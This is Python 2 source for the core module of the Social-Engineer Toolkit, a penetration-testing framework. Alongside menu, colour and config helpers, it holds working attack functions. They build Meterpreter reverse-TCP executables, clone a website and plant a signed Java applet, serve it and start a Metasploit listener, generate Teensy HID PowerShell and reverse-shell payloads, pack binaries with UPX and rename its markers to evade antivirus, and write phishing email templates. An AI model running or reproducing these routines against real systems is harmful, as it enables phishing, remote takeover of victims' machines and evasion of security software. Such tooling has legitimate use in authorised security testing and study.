#!/usr/bin/env python
#
# Centralized classes, work in progress
# 
## This will ultimately hold all functions for SET
import re
import sys
import socket
import subprocess
import shutil
import os
import time
import datetime
import random
import string
from src.core import dictionaries

# used to grab the true path for current working directory
definepath = os.getcwd()

#### ALWAYS SET TO ZERO BEFORE COMMIT!
debugLevel = 0    # 0=OFF
                  # 1=Uninterrupted (no pause/prompt to continue)
                  # 2=with pause/prompt for ENTER
debugFrameString = '-' * 72

# check operating system
def check_os():
        # detect if we're on windows
        if os.name == "nt":
                operating_system = "windows"

        # detect if we're on nix
        if os.name == "posix":
                operating_system = "posix"

        # return back the OS
        return operating_system

#
# Class for colors
#
if check_os() == "posix":
        class bcolors:
                PURPLE = '\033[95m'
                CYAN = '\033[96m'
                DARKCYAN = '\033[36m'
                BLUE = '\033[94m'
                GREEN = '\033[92m'
                YELLOW = '\033[93m'
                RED = '\033[91m'
                BOLD = '\033[1m'
                UNDERL = '\033[4m'
                ENDC = '\033[0m'
                backBlack = '\033[40m'
                backRed = '\033[41m'
                backGreen = '\033[42m'
                backYellow = '\033[43m'
                backBlue = '\033[44m'
                backMagenta = '\033[45m'
                backCyan = '\033[46m'
                backWhite = '\033[47m'

                def disable(self):
                	self.PURPLE = ''
                	self.CYAN = ''
                	self.BLUE = ''
                	self.GREEN = ''
                        self.YELLOW = ''
                	self.RED = ''
                	self.ENDC = ''
                	self.BOLD = ''
                	self.UNDERL = ''
                	self.backBlack = ''
                        self.backRed = ''
                        self.backGreen = ''
                        self.backYellow = ''
                        self.backBlue = ''
                        self.backMagenta = ''
                        self.backCyan = ''
                        self.backWhite = ''
                        self.DARKCYAN = ''
                        
# if we are windows or something like that then define colors as nothing
else:
         class bcolors:
                PURPLE = ''
                CYAN = ''
                DARKCYAN = ''
                BLUE = ''
                GREEN = ''
                YELLOW = ''
                RED = ''
                BOLD = ''
                UNDERL = ''
                ENDC = ''
                backBlack = ''
                backRed = ''
                backGreen = ''
                backYellow = ''
                backBlue = ''
                backMagenta = ''
                backCyan = ''
                backWhite = ''

                def disable(self):
                	self.PURPLE = ''
                	self.CYAN = ''
                	self.BLUE = ''
                	self.GREEN = ''
                        self.YELLOW = ''
                	self.RED = ''
                	self.ENDC = ''
                	self.BOLD = ''
                	self.UNDERL = ''
                	self.backBlack = ''
                        self.backRed = ''
                        self.backGreen = ''
                        self.backYellow = ''
                        self.backBlue = ''
                        self.backMagenta = ''
                        self.backCyan = ''
                        self.backWhite = ''
                        self.DARKCYAN = ''

# this will be the home for the set menus 
def setprompt(category, text):
	
	# if no special prompt and no text, return plain prompt
	if category == '0' and text == "":
		return bcolors.UNDERL + bcolors.DARKCYAN + "set" + bcolors.ENDC + "> "

	# if the loop is here, either category or text was positive
	# if it's the category that is blank...return prompt with only the text
	if category == '0':
		return bcolors.UNDERL + bcolors.DARKCYAN + "set" + bcolors.ENDC + "> " + text + ": "
	# category is NOT blank
	else:
		# initialize the base 'set' prompt
		prompt = bcolors.UNDERL + bcolors.DARKCYAN + "set" + bcolors.ENDC

		# if there is a category but no text
		if text == "":
			for level in category:
				level = dictionaries.category(level)
				prompt += ":" + bcolors.UNDERL + bcolors.DARKCYAN + level + bcolors.ENDC
			promptstring = str(prompt)
			promptstring += ">"
			return promptstring

		# if there is both a category AND text
		else:
			# iterate through the list recieved
			for level in category:
				level = dictionaries.category(level)
				prompt += ":" + bcolors.UNDERL + bcolors.DARKCYAN + level + bcolors.ENDC
			promptstring = str(prompt)
			promptstring = promptstring + "> " + text + ":"
			return promptstring
			
# 08/11/11
def ReturnContinue():
	print ("\n      Press " + bcolors.RED + "<return> " + bcolors.ENDC + "to continue")
	pause = raw_input()

# 08/11/11
def PrintStatus(message):
	print bcolors.GREEN + bcolors.BOLD + "[*] " + bcolors.ENDC + str(message)

# 08/11/11
def PrintInfo(message):
	print bcolors.BLUE + bcolors.BOLD + "[-] " + bcolors.ENDC + str(message)
	
# 02/27/12
def DebugImport(currentModule, importedModule):
        if debugLevel > 0:
                print "\n" + bcolors.RED + debugFrameString + "\nDEBUG_MSG: module " + currentModule + " attempting import of module " + importedModule + "\n" + debugFrameString + bcolors.ENDC
        if debugLevel > 1:
                raw_input("waiting for <ENTER>\n")
                
def DebugInfo(message):
        debugString = "\n" + bcolors.RED + debugFrameString + "\nDEBUG_MSG: " + str(message) + "\n" + debugFrameString + bcolors.ENDC
        
        if debugLevel == 0:
                return
        elif debugLevel == 1:
                print debugString
        
        elif debugLevel == 2:
                print debugString 
                raw_input("waiting for <ENTER>\n")
        else:
                pass

def PrintInfo_spaces(message):
	print bcolors.BLUE + bcolors.BOLD + "  [-] " + bcolors.ENDC + str(message)

# 08/11/11
def PrintWarning(message):
	print bcolors.YELLOW + bcolors.BOLD + "[!] " + bcolors.ENDC + str(message)

# 08/11/11
def PrintError(message):
	print bcolors.RED + bcolors.BOLD + "[!] " + bcolors.ENDC + bcolors.RED + str(message) + bcolors.ENDC


# standard set exit_menu
def ExitSet():
	print "\n\n Thank you for " + bcolors.RED+"shopping" + bcolors.ENDC+" at the Social-Engineer Toolkit.\n\n Hack the Gibson...and remember...hugs are worth more than handshakes.\n"
	sys.exit()

# get version
def GetVersion():
	define_version = '3.1.3'
	return define_version

# Generic menu creation class
class CreateMenu:
	def __init__(self, text, menu):
		self.text = text
		self.menu = menu
		
		print text
		#print "\nType 'help' for information on this module\n"

		for i, option in enumerate(menu):
			
			menunum = i + 1
			
			# Check to see if this line has the 'return to main menu' code
			match = re.search("0D", option) 
			
			# If it's not the return to menu line:
			if not match:
				if menunum < 10:
					print('   %s) %s' % (menunum,option))
				else:
					print('  %s) %s' % (menunum,option))
			else:
				print '\n  99) Return to Main Menu\n'
		return

#
# grab the metaspoit path
#
def meta_path():
	# DEFINE METASPLOIT PATH
	meta_path = file("%s/config/set_config" % (definepath),"r").readlines()
	for line in meta_path:
		line = line.rstrip()
		match = re.search("METASPLOIT_PATH=", line)
		if match:
			line = line.replace("METASPLOIT_PATH=","")
			msf_path = line.rstrip()
                        # if it doesn't end with a forward slash
                        if msf_path.endswith("/"): pass
                        else: msf_path = msf_path + "/"
			# path for metasploit
                        trigger = 0
			if not os.path.isdir(msf_path):
				# specific for backtrack5
				if os.path.isfile("/opt/framework3/msf3/msfconsole"):
					msf_path = "/opt/framework3/msf3/"
                                        trigger = 1
				if os.path.isfile("/opt/framework/msf3/msfconsole"):
					msf_path = "/opt/framework/msf3/"
                                        trigger = 1
                                if os.path.isfile("/opt/metasploit/msf3/msfconsole"):
                                        msf_path = "/opt/metasploit/msf3/"
                                        trigger = 1
				if trigger == 0:
                                        if check_os() != "windows":
                                                        #input = raw_input("[!] Unable to find Metasploit. Please enter a path or press {enter} to continue without it: ")
                                                        #if os.path.isfile(input+ "/msfconsole"):
                                                         #       msf_path = input
                                                          #      trigger = 1

                                                       # if not os.path.isfile(input + "/msfconsole"):
							check_metasploit = check_config("METASPLOIT_MODE=").lower()
							if check_metasploit != "off":
	                                                        PrintError("Metasploit path not found. These payloads will be disabled.")
        	                                                PrintError("Please configure in the config/set_config. Press {return} to continue")
                	                                        return False
                			if check_os() == "windows":
                                                PrintWarning("Metasploit payloads are not currently supported. This is coming soon.")
                                                msf_path = ""

			# this is an option if we don't want to use Metasploit period
			check_metasploit = check_config("METASPLOIT_MODE=").lower()
			if check_metasploit != "on": msf_path = False
			return msf_path

#
# grab the metaspoit path
#
def meta_database():
	# DEFINE METASPLOIT PATH
	meta_path = file("%s/config/set_config" % (definepath),"r").readlines()
	for line in meta_path:
		line = line.rstrip()
		match = re.search("METASPLOIT_DATABASE=", line)
		if match:
			line = line.replace("METASPLOIT_DATABASE=","")
			msf_database = line.rstrip()
			return msf_database


#
# grab the interface ip address
#
def grab_ipaddress():
	try:
		fileopen = file("%s/config/set_config" % (definepath), "r").readlines()
		for line in fileopen:
			line = line.rstrip()
			match = re.search("AUTO_DETECT=ON", line)
			if match:
				try:
					rhost = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
					rhost.connect(('google.com', 0))
					rhost.settimeout(2)
					rhost = rhost.getsockname()[0]
					return rhost
				except Exception:
					rhost = raw_input(setprompt("0", "Enter your interface IP Address"))
					while 1:
							# check if IP address is valid
							ip_check = is_valid_ip(rhost)
							if ip_check == False:
								rhost = raw_input("[!] Invalid ip address try again: ")
							if ip_check == True: break
					return rhost

		# if AUTO_DETECT=OFF prompt for IP Address
			match1 = re.search("AUTO_DETECT=OFF", line)
			if match1:
				rhost = raw_input(setprompt("0", "IP address for the payload listener"))
				while 1:
							# check if IP address is valid
							ip_check = is_valid_ip(rhost)
							if ip_check == False:
								rhost = raw_input("[!] Invalid ip address try again: ")
							if ip_check == True: break

				return rhost

	except Exception, e:
		PrintError("ERROR:Something went wrong:")
		print bcolors.RED + "ERROR:" + str(e) + bcolors.ENDC

#
# check for pexpect
#
def check_pexpect():
	try:
		import pexpect
	except:
                try:
                        import src.core.thirdparty.pexpect
                except:
        		PrintError("ERROR:PExpect is required in order to fully run SET")
                        PrintWarning("Please download and install PExpect: http://sourceforge.net/projects/pexpect/files/pexpect/Release%202.3/pexpect-2.3.tar.gz/download")
                        if check_os() == "posix":
                        	answer = raw_input(setprompt("0", "Would you like SET to attempt to install it for you? [yes|no]"))
                                if answer == "yes" or answer == "y":
                                        PrintInfo("Installing Pexpect")
                                        subprocess.Popen("wget http://downloads.sourceforge.net/project/pexpect/pexpect/Release%202.3/pexpect-2.3.tar.gz?use_mirror=hivelocity;tar -zxvf pexpect-2.3.tar.gz;cd pexpect-2.3/;python setup.py install", shell=True).wait()
                                        # clean up
                                        subprocess.Popen("rm -rf pexpect-2.3*", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
                                        PrintStatus("Finished... Relaunch SET, if it doesn't work for you, install manually.")
                                        sys.exit(1)
                                if answer == "no" or answer == 'n':
                                        sys.exit(1)
                                else:
                                        PrintError("ERROR:Invalid response, exiting the Social-Engineer Toolkit...")
                                        sys.exit(1)

#
# check for beautifulsoup
#
# try import for BeautifulSoup, required for MLITM
def check_beautifulsoup():
	try:
		import BeautifulSoup
	except:
                try:
                        import src.core.thirdparty.BeautifulSoup
                except:
        		PrintError("ERROR:BeautifulSoup is required in order to fully run SET")
                        PrintWarning("Please download and install BeautifulSoup: http://www.crummy.com/software/BeautifulSoup/download/3.x/BeautifulSoup-3.2.0.tar.gz")
                        if check_os() == "posix":
                        	answer = raw_input(setprompt("0", "Would you like SET to attempt to install it for you? [yes|no]"))	
                        	if answer == "yes" or answer == "y":
                        		PrintInfo("Installing BeautifulSoup...")
                                	subprocess.Popen("wget http://www.crummy.com/software/BeautifulSoup/download/3.x/BeautifulSoup-3.2.0.tar.gz;tar -zxvf BeautifulSoup-3.2.0.tar.gz;cd BeautifulSoup-*;python setup.py install", shell=True).wait()
                                        # clean up
                                	subprocess.Popen("rm -rf BeautifulSoup-*", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
                                	PrintStatus("Finished... Relaunch SET, if it doesn't work for you, install manually.")
                                	sys.exit(1)
	
                                if answer == "no" or answer == "n":
                                	sys.exit()
                                else:
                                	PrintError("ERROR:Invalid response, exiting the Social-Engineer Toolkit...")
                                	sys.exit(1)
# mssql check
def check_mssql():
   try:
       import _mssql
   except:
        PrintError("ERROR:pymssql is required in order to fully run SET")
        PrintWarning("Please download and install pymssql: http://code.google.com/p/pymssql/downloads/list")
        if check_os() == "posix":
                answer = raw_input(setprompt("0", "Would you like SET to attempt to install it for you? [yes|no]"))

                if answer == "yes" or answer == "y":
                        PrintInfo("Installing pymssql")
                        if os.path.isfile("/usr/bin/yum"):
                                subprocess.Popen("yum install pymssql", shell=True).wait()
                                PrintStatus("Finished... Relaunch SET, if it doesn't work for you, install manually.")
                                try: sys.exit(0)
                                except SystemExit:
                                        pass
                        elif os.path.isfile("/usr/bin/apt-get"):
                                subprocess.Popen("apt-get install python-pymssql", shell=True).wait()
                                PrintStatus("Finished... Relaunch SET, if it doesn't work for you, install manually.")
                                try: sys.exit(0)
                                except SystemExit:
                                        pass
                        else:
                                print "No luck identifying an installer. Please install pymssql manually."
                                try: sys.exit(0)
                                except SystemExit:
                                        pass
                elif answer == "no" or answer == 'n':
                        sys.exit(1)
                else:
                        PrintError("ERROR:Invalid response, exiting the Social-Engineer Toolkit...")
                        sys.exit(1)
# 
# cleanup old or stale files
#
def cleanup_routine():
	try:	
	        # restore original Java Applet
        	shutil.copyfile("%s/src/html/Signed_Update.jar.orig" % (definepath), "%s/src/program_junk/Signed_Update.jar" % (definepath))
        	if os.path.isfile("newcert.pem"):
                	os.remove("newcert.pem")
        	if os.path.isfile("src/program_junk/interfaces"):
                	os.remove("src/program_junk/interfaces")
        	if os.path.isfile("src/html/1msf.raw"):
                	os.remove("src/html/1msf.raw")
        	if os.path.isfile("src/html/2msf.raw"):
                	os.remove("src/html/2msf.raw")
        	if os.path.isfile("msf.exe"):
                	os.remove("msf.exe")
        	if os.path.isfile("src/html/index.html"):
                	os.remove("src/html/index.html")
        	if os.path.isfile("src/program_junk/Signed_Update.jar"):
                	os.remove("src/program_junk/Signed_Update.jar")
	except:
		pass

#
# Update Metasploit
#
def update_metasploit():
	PrintInfo("Updating the Metasploit Framework...Be patient.")
	msf_path = meta_path()
	svn_update = subprocess.Popen("cd %s/;svn update" % (msf_path), shell=True).wait()
	PrintStatus("Metasploit has successfully updated!")
	ReturnContinue()

#
# Update The Social-Engineer Toolkit
#
def update_set():
	PrintInfo("Updating the Social-Engineer Toolkit, be patient...")
	subprocess.Popen("svn update", shell=True).wait()
	PrintStatus("The updating has finished, returning to main menu..")
	time.sleep(2)

#
# Pull the help menu here
#
def help_menu():
	fileopen = file("readme/README","r").readlines()
	for line in fileopen:
		line = line.rstrip()
		print line
	fileopen = file("readme/CREDITS", "r").readlines()
	print "\n"
	for line in fileopen:
		line = line.rstrip()
		print line
	ReturnContinue()


#
# This is a small area to generate the date and time
#
def date_time():
	now = str(datetime.datetime.today())
	return now

#
# generate a random string
#
def generate_random_string(low, high):
	length = random.randint(low, high)
	letters = string.ascii_letters+string.digits
	return ''.join([random.choice(letters) for _ in range(length)])

#
# clone JUST a website, and export it.
# Will do no additional attacks.
#
def site_cloner(website, exportpath, *args):

	# grab the interface IP address
	grab_ipaddress()
	ipaddr = grab_ipaddress()
	
	# open up file for writing
	filewrite = file("src/program_junk/interface", "w")

	# write the ipaddress
	filewrite.write(ipaddr)

	# close the file
	filewrite.close()

	# write it to alternative path
	filewrite = file("src/program_junk/ipaddr", "w")

	# write the ipaddress
	filewrite.write(ipaddr)

	# close the file
	filewrite.close()

	# open up file to write for website address
	filewrite = file("src/program_junk/site.template", "w")

	# write out URL=websiteaddress.com
	filewrite.write("URL=" + website)

	# close the file
	filewrite.close()

	# if we specify a second argument this means we want to use java applet
	if args[0] == "java":
		# needed to define attack vector
		filewrite = file("src/program_junk/attack_vector", "w")

		# write out the java applet attack vector
		filewrite.write("java")

		# close the file
		filewrite.close()

	# redirect system path to src/webattack/web_clone
	sys.path.append("src/webattack/web_clone")

	# if we are using menu mode we reload just in case
	try:
		reload(cloner)

	# import the cloner module from SET
	except:
		import cloner

	# copy the file to a new folder
	PrintStatus("Site has been successfully cloned and is: " + exportpath)
	subprocess.Popen("mkdir '%s';cp src/program_junk/web_clone/* '%s'" % (exportpath, exportpath), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()

#
# this will generate a meterpreter reverse payload (executable)
# with backdoored executable, digital signature stealing, and
# UPX encoded (if these options are enabled). It will automatically
# inherit the AUTO_DETECT=ON or OFF configuration.
#
# usage: metasploit_reverse_tcp_exe(portnumber)
# 
def meterpreter_reverse_tcp_exe(port):

	# grab the interface IP address
	ipaddr = grab_ipaddress()

	# open up file for writing
	filewrite = file("src/program_junk/interface", "w")

	# write the ipaddress
	filewrite.write(ipaddr)

	# close the file
	filewrite.close()

	# write it to alternative path
	filewrite = file("src/program_junk/ipaddr", "w")

	# write the ipaddress
	filewrite.write(ipaddr)

	# close the file
	filewrite.close()

	# write it to alternative path
	filewrite = file("src/program_junk/ipaddr.file", "w")

	# write the ipaddress
	filewrite.write(ipaddr)

	# close the file
	filewrite.close()

	# trigger a flag to be checked in payloadgen
	# if this flag is true, it will skip the questions
	filewrite = file("src/program_junk/meterpreter_reverse_tcp_exe", "w")
	filewrite.write(port)
	filewrite.close()

	# import the system path for payloadgen in SET
	sys.path.append("src/core/payloadgen")
	try:
		reload(create_payloads)
	except:
		import create_payloads


	random_value = generate_random_string(5, 10)

	# copy the created executable to program_junk
	PrintStatus("Executable created under src/program_junk/%s.exe" % (random_value))
	subprocess.Popen("cp src/html/msf.exe src/program_junk/%s.exe" % (random_value), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait() 


#
# Start a metasploit multi handler
#
def metasploit_listener_start(payload,port):
	
	# open a file for writing
	filewrite = file("%s/src/program_junk/msf_answerfile" % (definepath), "w")
	filewrite.write("use multi/handler\nset payload %s\nset LHOST 0.0.0.0\nset LPORT %s\nexploit -j\n\n" % (payload, port))
	# close the file
	filewrite.close()
	
	# launch msfconsole
	metasploit_path = meta_path()
	subprocess.Popen("%s/msfconsole -r %s/src/program_junk/msf_answerfile" % (metasploit_path, definepath), shell=True).wait()

#
# This will start a web server in the directory root you specify, so for example
# you clone a website then run it in that web server, it will pull any index.html file
#
def start_web_server(directory):

	try:
		# import the threading, socketserver, and simplehttpserver
		import thread, SocketServer, SimpleHTTPServer
		# create the httpd handler for the simplehttpserver
		# we set the allow_reuse_address incase something hangs can still bind to port
		class ReusableTCPServer(SocketServer.TCPServer): allow_reuse_address=True
		# specify the httpd service on 0.0.0.0 (all interfaces) on port 80
		httpd = ReusableTCPServer(("0.0.0.0", 80), SimpleHTTPServer.SimpleHTTPRequestHandler)
		# thread this mofo
		os.chdir(directory)
		thread.start_new_thread(httpd.serve_forever, ())
		#httpd.serve_forever()
		# change directory to the path we specify for output path
		# os.chdir(directory)

	# handle keyboard interrupts
	except KeyboardInterrupt:
		PrintInfo("Exiting the SET web server...")
		httpd.socket.close()

#
# this will start a web server without threads
#
def start_web_server_unthreaded(directory):
	try:
		# import the threading, socketserver, and simplehttpserver
		import thread, SocketServer, SimpleHTTPServer
		# create the httpd handler for the simplehttpserver
		# we set the allow_reuse_address incase something hangs can still bind to port
		class ReusableTCPServer(SocketServer.TCPServer): allow_reuse_address=True
		# specify the httpd service on 0.0.0.0 (all interfaces) on port 80
		httpd = ReusableTCPServer(("0.0.0.0", 80), SimpleHTTPServer.SimpleHTTPRequestHandler)
		# thread this mofo
		os.chdir(directory)
		httpd.serve_forever()
		# change directory to the path we specify for output path
		os.chdir(directory)

	# handle keyboard interrupts
	except KeyboardInterrupt:
		PrintInfo("Exiting the SET web server...")
		httpd.socket.close()


#
# This will create the java applet attack from start to finish.
# Includes payload (reverse_meterpreter for now) cloning website
# and additional capabilities.
#
def java_applet_attack(website, port, directory):

	# create the payload
	meterpreter_reverse_tcp_exe(port)

	# clone the website and inject java applet
	site_cloner(website,directory,"java")

	# this part is needed to rename the msf.exe file to a randomly generated one
	if os.path.isfile("src/program_junk/rand_gen"):
		# open the file
		fileopen = file("src/program_junk/rand_gen", "r")
		# start a loop
		for line in fileopen:
			# define executable name and rename it
			filename = line.rstrip()
			# move the file to the specified directory and filename
			subprocess.Popen("cp src/html/msf.exe %s/%s" % (directory,filename), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()


	# lastly we need to copy over the signed applet
	subprocess.Popen("cp src/program_junk/Signed_Update.jar %s" % (directory), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()

	# start the web server by running it in the background
	start_web_server(directory)

	# run multi handler for metasploit
	PrintInfo("Starting the multi/handler through Metasploit...")
	metasploit_listener_start("windows/meterpreter/reverse_tcp",port)

#
# this will create a raw PDE file for you to use in your teensy device
#
#
def teensy_pde_generator(attack_method):

	# grab the ipaddress
	ipaddr=grab_ipaddress()

	# if we are doing the attack vector teensy beef
	if attack_method == "beef":
		# specify the filename
		filename = file("src/teensy/beef.pde", "r")
		filewrite = file("reports/beef.pde", "w")
		teensy_string = ("Successfully generated Teensy HID Beef Attack Vector under reports/beef.pde")

	# if we are doing the attack vector teensy beef
	if attack_method == "powershell_down":
		# specify the filename
		filename = file("src/teensy/powershell_down.pde", "r")
		filewrite = file("reports/powershell_down.pde", "w")
		teensy_string = ("Successfully generated Teensy HID Attack Vector under reports/powershell_down.pde")

	# if we are doing the attack vector teensy 
	if attack_method == "powershell_reverse":
		# specify the filename
		filename = file("src/teensy/powershell_reverse.pde", "r")
		filewrite = file("reports/powershell_reverse.pde", "w")
		teensy_string = ("Successfully generated Teensy HID Attack Vector under reports/powershell_reverse.pde")

	# if we are doing the attack vector teensy beef
	if attack_method == "java_applet":
		# specify the filename
		filename = file("src/teensy/java_applet.pde", "r")
		filewrite = file("reports/java_applet.pde", "w")
		teensy_string = ("Successfully generated Teensy HID Attack Vector under reports/java_applet.pde")

	# if we are doing the attack vector teensy 
	if attack_method == "wscript":
		# specify the filename
		filename = file("src/teensy/wscript.pde", "r")
		filewrite = file("reports/wscript.pde", "w")
		teensy_string = ("Successfully generated Teensy HID Attack Vector under reports/wscript.pde")

	# All the options share this code except binary2teensy
	if attack_method != "binary2teensy":
		for line in filename:
			line = line.rstrip()
			match = re.search("IPADDR", line)
			if match:
				line = line.replace("IPADDR", ipaddr)
			filewrite.write(line)
			
	# binary2teensy method
	if attack_method == "binary2teensy":
		# specify the filename
		import src.teensy.binary2teensy
		teensy_string = ("Successfully generated Teensy HID Attack Vector under reports/binary2teensy.pde")

	PrintStatus(teensy_string)
#
# Expand the filesystem windows directory
# 

def windows_root():
	return os.environ['WINDIR']

#
# core log file routine for SET
#
def log(error):
	# open log file only if directory is present (may be out of directory for some reason)
	if not os.path.isfile("%s/src/logs/set_logfile.log" % (definepath)): 
                filewrite = file("%s/src/logs/set_logfile.log" % (definepath), "w")
                filewrite.write("")
                filewrite.close()
	if os.path.isfile("%s/src/logs/set_logfile.log" % (definepath)):
		error = str(error)
		# open file for writing
		filewrite = file("%s/src/logs/set_logfile.log" % (definepath), "a")
		# write error message out
		filewrite.write("ERROR: " + date_time() + ": " + error + "\n")
		# close the file
		filewrite.close()

#
# upx encoding and modify binary
#
def upx(path_to_file):
	# open the set_config
	fileopen = file("config/set_config", "r")
	for line in fileopen:
		line = line.rstrip()
		match = re.search("UPX_PATH=", line)
		if match:
			upx_path = line.replace("UPX_PATH=", "")
	
	# if it isn't there then bomb out
	if not os.path.isfile(upx_path):
		PrintWarning("UPX was not detected. Try configuring the set_config again.")

	# if we detect it
	if os.path.isfile(upx_path):
		PrintInfo("Packing the executable and obfuscating PE file randomly, one moment.")
		# packing executable
		subprocess.Popen("%s -9 -q -o src/program_junk/temp.binary %s" % (upx_path, path_to_file), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
		# move it over the old file
		subprocess.Popen("mv src/program_junk/temp.binary %s" % (path_to_file), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
		
		# random string
		random_string = generate_random_string(3,3).upper()

		# 4 upx replace - we replace 4 upx open the file
		fileopen = file(path_to_file, "rb")
		filewrite = file("src/program_junk/temp.binary", "wb")
		
		# read the file open for data
		data = fileopen.read()
		# replace UPX stub makes better evasion for A/V
		filewrite.write(data.replace("UPX", random_string, 4))
		filewrite.close()
		# copy the file over
		subprocess.Popen("mv src/program_junk/temp.binary %s" % (path_to_file), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
	time.sleep(3)

def show_banner(define_version,graphic):

	if graphic == "1":
                if check_os() == "posix":
        		os.system("clear")
        	if check_os() == "windows":
                        os.system("cls")
		show_graphic()
	else:
		os.system("clear")
	
	print bcolors.BLUE + """
  [---]        The Social-Engineer Toolkit ("""+bcolors.YELLOW+"""SET"""+bcolors.BLUE+""")         [---]
  [---]        Created by:""" + bcolors.RED+""" David Kennedy """+bcolors.BLUE+"""("""+bcolors.YELLOW+"""ReL1K"""+bcolors.BLUE+""")         [---]
  [---]        Development Team: """ + bcolors.RED + """JR DePre (pr1me)""" + bcolors.BLUE + """        [---]
  [---]        Development Team: """ + bcolors.RED + """Joey Furr (j0fer)""" + bcolors.BLUE + """       [---]
  [---]        Development Team: """ + bcolors.RED + """Thomas Werth     """ + bcolors.BLUE + """       [---]
  [---]        Development Team: """ + bcolors.RED + """Garland     """ + bcolors.BLUE + """            [---]
  [---]                 Version: """+bcolors.RED+"""%s""" % (define_version) +bcolors.BLUE+"""                   [---]
  [---]            Codename: '""" + bcolors.YELLOW + """User Awareness""" + bcolors.BLUE + """'            [---]
  [---]         Report """ + bcolors.RED +"""bugs""" + bcolors.BLUE + """:"""+ bcolors.GREEN + """ davek@secmaniac.com    """ + bcolors.BLUE+"""     [---]
  [---]         Follow me on Twitter: """ + bcolors.PURPLE+ """dave_rel1k""" + bcolors.BLUE+"""         [---]
  [---]        Homepage: """ + bcolors.YELLOW + """http://www.secmaniac.com""" + bcolors.BLUE+"""        [---]

""" + bcolors.GREEN+"""   Welcome to the Social-Engineer Toolkit (SET). Your one
    stop shop for all of your social-engineering needs..
    """ 
	print bcolors.BLUE + """    Join us on irc.freenode.net in channel #setoolkit\n""" + bcolors.ENDC
        print  bcolors.RED + """         Help support the toolkit, rank it here:\n  http://sectools.org/tool/socialengineeringtoolkit/#comments\n""" + bcolors.ENDC

def show_graphic():
	menu = random.randrange(2,10)
	if menu == 2:
		print bcolors.YELLOW + r"""
                         .--.  .--. .-----.
                        : .--': .--'`-. .-'
                        `. `. : `;    : :  
                         _`, :: :__   : :  
                        `.__.'`.__.'  :_;   """ + bcolors.ENDC
                return
    
	if menu == 3:
		print bcolors.GREEN + r"""
                  _______________________________
                 /   _____/\_   _____/\__    ___/
                 \_____  \  |    __)_   |    |   
                 /        \ |        \  |    |   
                /_______  //_______  /  |____|   
                        \/         \/            """ + bcolors.ENDC
		return
	
	if menu == 4:
		print bcolors.BLUE + r"""                                               
                 :::===  :::===== :::====
                 :::     :::      :::====
                  =====  ======     ===  
                     === ===        ===  
                 ======  ========   ===  
""" + bcolors.ENDC

	if menu == 5:
		print bcolors.RED + r"""
                ..######..########.########
                .##....##.##..........##...
                .##.......##..........##...
                ..######..######......##...
                .......##.##..........##...
                .##....##.##..........##...
                ..######..########....##...  """ + bcolors.ENDC
		return

	if menu == 6:
		print bcolors.PURPLE + r'''
                 .M"""bgd `7MM"""YMM MMP""MM""YMM 
                ,MI    "Y   MM    `7 P'   MM   `7 
                `MMb.       MM   d        MM      
                  `YMMNq.   MMmmMM        MM      
                .     `MM   MM   Y  ,     MM      
                Mb     dM   MM     ,M     MM      
                P"Ybmmd"  .JMMmmmmMMM   .JMML.''' + bcolors.ENDC

		return
	
	if menu == 7:
		print bcolors.YELLOW + r""" 
                ________________________
                __  ___/__  ____/__  __/
                _____ \__  __/  __  /   
                ____/ /_  /___  _  /    
                /____/ /_____/  /_/     """ + bcolors.ENDC
		return

        if menu == 8:
                print bcolors.RED + r'''
            !\_________________________/!\
            !!                         !! \
            !! Social-Engineer Toolkit !!  \
            !!                         !!  !
            !!          u r so         !!  !
            !!                         !!  !
            !!          #pwnd          !!  !
            !!                         !!  !
            !!                         !!  /
            !!_________________________!! /
            !/_________________________\!/
               __\_________________/__/!_
              !_______________________!/
            ________________________
           /oooo  oooo  oooo  oooo /!
          /ooooooooooooooooooooooo/ /
         /ooooooooooooooooooooooo/ /
        /C=_____________________/_/''' + bcolors.ENDC


        if menu == 9:
                print bcolors.YELLOW + """
        01011001011011110111010100100000011100
        10011001010110000101101100011011000111
        10010010000001101000011000010111011001
        10010100100000011101000110111100100000
        01101101011101010110001101101000001000
        00011101000110100101101101011001010010
        00000110111101101110001000000111100101
        10111101110101011100100010000001101000
        01100001011011100110010001110011001000
        00001110100010110100101001001000000101
        01000110100001100001011011100110101101
        11001100100000011001100110111101110010
        00100000011101010111001101101001011011
        10011001110010000001110100011010000110
        01010010000001010011011011110110001101
        10100101100001011011000010110101000101
        01101110011001110110100101101110011001
        01011001010111001000100000010101000110
        11110110111101101100011010110110100101
        11010000100000001010100110100001110101
        011001110111001100101010""" + bcolors.ENDC

#
# identify if set interactive shells are disabled
#
def set_check():
	fileopen=file("config/set_config", "r")
	for line in fileopen:
		match = re.search("SET_INTERACTIVE_SHELL=OFF", line)
		# if we turned it off then we return a true else return false
		if match: 
			return True
		match1 = re.search("SET_INTERACTIVE_SHELL=ON", line)
		# return false otherwise
		if match1:
			return False

# if the user specifies 99
def menu_back():
	PrintInfo("Returning to the previous menu...")

# used to generate random templates for the phishing schema
def custom_template():
	try:
		print ("         [****]  Custom Template Generator [****]\n")
		print ("Always looking for new templates! In the set/src/templates directory send an email\n   to davek@secmaniac.com if you got a good template!")
		author=raw_input(setprompt("0", "Enter the name of the author"))
		filename=randomgen=random.randrange(1,99999999999999999999)
		filename=str(filename)+(".template")
		subject=raw_input(setprompt("0", "Enter the subject of the email"))
		try:
			body=raw_input(setprompt("0", "Enter the body of the message, hit return for a new line. Control+c when finished: "))
			while body != 'sdfsdfihdsfsodhdsofh':
				try:
					body+=(r"\n")
					body+=raw_input("Next line of the body: ")
				except KeyboardInterrupt: break
		except KeyboardInterrupt: pass
		filewrite=file("src/templates/%s" % (filename), "w")
		filewrite.write("# Author: "+author+"\n#\n#\n#\n")
		filewrite.write('SUBJECT='+'"'+subject+'"\n\n')
		filewrite.write('BODY='+'"'+body+'"\n')
		print "\n"
		filewrite.close()
	except Exception, e:
		PrintError("ERROR:An error occured:")
		print bcolors.RED + "ERROR:" + str(e) + bcolors.ENDC


# routine for checking length of a payload: variable equals max choice
